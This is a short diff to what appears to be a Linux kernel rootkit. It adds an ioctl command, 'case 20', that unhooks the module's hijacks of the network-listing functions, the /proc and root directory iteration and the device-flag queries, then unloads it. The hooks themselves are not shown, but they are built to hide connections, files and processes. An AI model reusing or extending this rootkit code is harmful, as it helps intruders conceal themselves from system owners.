@@ -923,6 +923,17 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                 spin_unlock_irqrestore(&spinlock, flags);
 
                 break;
+            case 20:
+                DEBUG("Killing Module...");
+                hookrw_exit();
+                hijack_stop(inet_ioctl);
+                hijack_stop(dev_get_flags);
+                hijack_stop(udp6_seq_show);
+                hijack_stop(udp4_seq_show);
+                hijack_stop(tcp6_seq_show);
+                hijack_stop(tcp4_seq_show);
+                hijack_stop(root_iterate);
+                hijack_stop(proc_iterate);
 
             default:
                 break;
